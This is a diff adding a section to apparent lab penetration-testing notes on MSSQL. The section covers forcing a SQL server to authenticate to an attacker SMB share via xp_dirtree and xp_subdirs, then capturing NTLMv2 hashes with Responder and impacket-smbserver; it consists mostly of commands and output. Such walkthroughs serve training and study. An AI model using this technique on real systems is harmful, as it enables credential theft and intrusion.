@@ -1105,6 +1105,59 @@ DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote         
 
 # MSSQL - Walkthrough
 
+## Capture Service Hash
+
+
+```cmd
+1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
+2> GO
+
+subdirectory    depth
+--------------- -----------
+```
+
+```cmd
+1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
+2> GO
+```
+
+### Responder 
+
+```bash
+akhmadkun@htb[/htb]$ sudo responder -I tun0
+
+                                         __               
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|              
+<SNIP>
+
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.10.110.17
+[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
+[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7
+```
+
+### smbserver
+
+```shell
+akhmadkun@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
+[*] Config file parsed                                                 
+[*] Config file parsed                                                 
+[*] Config file parsed
+[*] Incoming connection (10.129.203.7,49728)
+[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
+[*] User WINSRV02\mssqlsvc authenticated successfully                        
+[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:010100000000000
+```
+
 ## Existing Databases
 
 ```SQL
